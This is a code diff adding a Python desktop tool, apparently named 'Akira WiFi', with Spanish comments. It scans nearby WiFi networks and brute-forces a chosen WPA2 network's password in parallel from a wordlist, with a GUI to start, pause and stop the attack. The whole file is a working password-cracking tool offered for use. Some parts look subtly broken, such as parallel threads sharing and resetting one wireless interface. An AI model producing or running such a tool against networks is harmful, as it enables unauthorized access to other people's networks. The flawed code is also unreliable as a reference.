@@ -1,0 +1,191 @@
+import concurrent.futures  # Para la ejecución en paralelo
+import customtkinter as ctk
+from tkinter import filedialog
+import pywifi
+from pywifi import const
+import time
+import threading
+from PIL import Image, ImageTk  # Importar PIL para manejar imágenes
+
+# Variable global para manejar la pausa y el stop
+pausado = False
+detener = False
+
+# Escanear redes WiFi disponibles
+def escanear_wifi():
+    wifi = pywifi.PyWiFi()
+    interfaz = wifi.interfaces()[0]  # Seleccionamos la primera interfaz
+    if interfaz.status() in [const.IFACE_CONNECTED, const.IFACE_DISCONNECTED]:
+        interfaz.scan()  # Iniciamos el escaneo
+        time.sleep(3)  # Esperamos un momento para que termine el escaneo
+        resultados_escaneo = interfaz.scan_results()  # Obtenemos los resultados
+
+        redes = {}
+        for red in resultados_escaneo:
+            if red.ssid and red.ssid not in redes:  # Evitar duplicados de SSIDs
+                redes[red.ssid] = red.bssid
+        
+        return redes
+    else:
+        return None  # Si la interfaz no está lista, devolvemos None
+
+# Intentar conectarse a una red WiFi con una contraseña específica
+def conectar_a_red(ssid, contraseña):
+    wifi = pywifi.PyWiFi()
+    interfaz = wifi.interfaces()[0]
+
+    perfil = pywifi.Profile()
+    perfil.ssid = ssid
+    perfil.auth = const.AUTH_ALG_OPEN
+    perfil.akm.append(const.AKM_TYPE_WPA2PSK)
+    perfil.cipher = const.CIPHER_TYPE_CCMP
+    perfil.key = contraseña
+
+    interfaz.remove_all_network_profiles()
+    perfil_tmp = interfaz.add_network_profile(perfil)
+    interfaz.connect(perfil_tmp)
+
+    time.sleep(5)
+
+    if interfaz.status() == const.IFACE_CONNECTED:
+        return True
+    else:
+        return False
+
+# Realizar un ataque de fuerza bruta paralelo para encontrar la contraseña de una red WiFi
+def fuerza_bruta_wifi_paralelo(ssid, archivo_contraseñas, ventana, texto_contraseñas, max_workers=5):
+    global pausado, detener
+
+    def probar_contraseña(contraseña):
+        nonlocal ssid
+        if detener:
+            return None  # Si se presiona "Detener", termina el ciclo.
+        while pausado:
+            time.sleep(1)  # Pausar el ciclo mientras está en pausa.
+            
+        texto_contraseñas.set(f"Probando: {contraseña.strip()}")
+        ventana.update() 
+
+        if conectar_a_red(ssid, contraseña.strip()):
+            return contraseña.strip()  # Retorna la contraseña si se encuentra
+        return None
+
+    # Abrimos el archivo de contraseñas
+    with open(archivo_contraseñas, 'r', encoding='utf-8', errors='ignore') as archivo:
+        contraseñas = archivo.readlines()
+
+    # Usamos ThreadPoolExecutor para paralelizar las tareas
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Ejecutar las pruebas de contraseña en paralelo
+        futuros = [executor.submit(probar_contraseña, contraseña) for contraseña in contraseñas]
+        
+        for future in concurrent.futures.as_completed(futuros):
+            resultado = future.result()
+            if resultado:
+                texto_contraseñas.set(f"[!] Contraseña encontrada: {resultado}")
+                print(f"[!] Contraseña encontrada: {resultado}")
+                detener = True  # Detener el resto de las tareas
+                break
+            ventana.update()
+    
+    if not detener:
+        texto_contraseñas.set("Fuerza bruta completada.")
+
+# Funciones de control
+def pausar_proceso():
+    global pausado
+    pausado = not pausado  # Alterna entre pausar y reanudar
+    if pausado:
+        btn_pausa.config(text="Reanudar")
+    else:
+        btn_pausa.config(text="Pausar")
+
+def detener_proceso():
+    global detener
+    detener = True
+
+# Función para comenzar el ataque de fuerza bruta
+def comenzar_fuerza_bruta():
+    global pausado, detener
+    pausado = False
+    detener = False
+    ssid_objetivo = combo_ssid.get()
+
+    # Seleccionar archivo de contraseñas
+    archivo_contraseñas = filedialog.askopenfilename(
+        title="Seleccionar archivo de contraseñas",
+        filetypes=[("Archivos de texto", "*.txt")]
+    )
+
+    # Lanzar el proceso de fuerza bruta en un nuevo hilo
+    hilo_fuerza_bruta = threading.Thread(
+        target=fuerza_bruta_wifi_paralelo,
+        args=(ssid_objetivo, archivo_contraseñas, root, texto_contraseñas)  # Aquí pasamos el archivo_contraseñas
+    )
+    hilo_fuerza_bruta.start()
+
+# Escanear redes WiFi disponibles y actualizar la lista en el ComboBox
+def actualizar_redes():
+    texto_contraseñas.set("Escaneando redes WiFi...")
+    redes = escanear_wifi()
+    
+    if redes:
+        print(redes)  # Verificar si las redes están siendo detectadas
+        combo_ssid.set('')  # Reseteamos la selección actual
+        combo_ssid.configure(values=list(redes.keys()))  # Actualizamos el ComboBox con las redes encontradas
+        
+        if len(redes) > 0:
+            texto_contraseñas.set(f"Redes disponibles: {len(redes)} encontradas.")
+            combo_ssid.set(list(redes.keys())[0])  # Seleccionamos la primera red por defecto
+        else:
+            texto_contraseñas.set("No se encontraron redes WiFi.")
+    else:
+        texto_contraseñas.set("No se encontraron redes WiFi o hubo un error con la interfaz.")
+
+ 
+# Configuración de la interfaz gráfica con customtkinter
+ctk.set_appearance_mode("dark")  # Modo oscuro
+ctk.set_default_color_theme("green")  # Tema verde
+
+root = ctk.CTk()
+root.title("Akira WiFi")
+root.geometry("500x500")  # Cambié el tamaño de la ventana para acomodar la imagen
+
+# Cargar y mostrar la imagen
+imagen = Image.open("C:/Users/Akira/Desktop/auditorias/aplicaciones/picture.png")
+imagen = imagen.resize((150, 150))  # Ajustar el tamaño de la imagen si es necesario
+imagen_tk = ImageTk.PhotoImage(imagen)
+
+label_imagen = ctk.CTkLabel(root, image=imagen_tk, text="")  # Mostrar la imagen en la interfaz
+label_imagen.pack(pady=10)
+
+# Texto para el SSID
+label_ssid = ctk.CTkLabel(root, text="Red WiFi objetivo:")
+label_ssid.pack(pady=5)
+
+# ComboBox para seleccionar SSID
+combo_ssid = ctk.CTkComboBox(root, width=300, state="readonly")
+combo_ssid.pack(pady=5)
+
+# Botón para escanear redes WiFi
+btn_escanear = ctk.CTkButton(root, text="Escanear redes WiFi", command=actualizar_redes)
+btn_escanear.pack(pady=10)
+
+# Texto dinámico para mostrar las contraseñas
+texto_contraseñas = ctk.StringVar()
+texto_contraseñas.set("Esperando para iniciar...")
+lbl_contraseñas = ctk.CTkLabel(root, textvariable=texto_contraseñas)
+lbl_contraseñas.pack(pady=10)
+
+# Botones de control
+btn_iniciar = ctk.CTkButton(root, text="Iniciar Fuerza Bruta", command=comenzar_fuerza_bruta)
+btn_iniciar.pack(pady=5)
+
+btn_pausa = ctk.CTkButton(root, text="Pausar", command=pausar_proceso)
+btn_pausa.pack(pady=5)
+
+btn_detener = ctk.CTkButton(root, text="Detener", command=detener_proceso)
+btn_detener.pack(pady=5)
+
+# Iniciar el loop de la interfaz gráfica
+root.mainloop()   
